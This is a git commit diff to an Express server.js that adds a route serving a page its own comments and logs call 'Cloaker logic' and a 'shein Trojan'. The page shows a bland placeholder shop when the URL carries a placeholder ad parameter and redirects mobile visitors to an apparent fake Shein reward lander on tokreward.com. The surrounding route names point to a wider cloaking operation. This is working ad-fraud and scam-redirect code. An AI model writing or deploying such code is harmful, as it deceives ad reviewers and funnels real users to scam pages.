1eb9ad20cf1847d4cc86407a71ec410e628cca30
carsoncraig1 <156372400+carsoncraig1@users.noreply.github.com>
2024-07-20 17:11:45 -0400

    Update server.js

--- server.js
+++ server.js
@@ -1066,6 +1066,72 @@ app.get('/sheinv3/:slug', (req, res, next) => {
      console.log(`Served sheinv3 Trojan (${slug})`);
 });
 
+// Middleware to pass on my slug values to MaxConv (H&M CAMP)
+app.get('/esp/:slug', (req, res, next) => {
+    const { slug } = req.params;
+    const destinationLander = `https://tokreward.com/sheinesp.html`;
+    const trojanHTML = `
+        <!DOCTYPE html>
+        <html lang="en">
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <script>
+                // Cloaker logic
+                const urlParams = new URLSearchParams(window.location.search);
+                const utmXXX = urlParams.get("xxx");
+                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+                if (utmXXX === "__PLACEMENT__") {
+                    } else if (isMobileDevice) {
+                        window.location.href = "${destinationLander}";
+                    } else {
+                    }
+            </script>
+            <title>${slug}</title>
+            <style>
+        body {
+            font-family: Arial, sans-serif;
+            line-height: 1.6;
+            margin: 0;
+            padding: 0;
+        }
+        header {
+            background: #333;
+            color: #fff;
+            text-align: center;
+            padding: 1rem;
+        }
+        main {
+            padding: 20px;
+        }
+        footer {
+            background: #333;
+            color: #fff;
+            text-align: center;
+            padding: 1rem;
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+        }
+    </style>
+        </head>
+        <body>
+            <h1>Welcome to ${slug} Shop!</h1>
+            <p>You are shopping at: ${slug}</p>
+             <main>
+        <h2>About Us</h2>
+        <p>This is a simple website.</p>
+    </main>
+     <footer>
+         <p>&copy; 2024 My Website. All rights reserved. | <a href="https://tokreward.com/pp.html">Privacy Policy</a></p>
+    </footer>
+        </body>
+        </html>
+            `;
+            res.send(trojanHTML);
+            console.log(`Served shein Trojan (${slug})`);
+});
+
 
 // DUDDV3 CLOAKER
 app.get('/duddv3/:slug', (req, res, next) => {
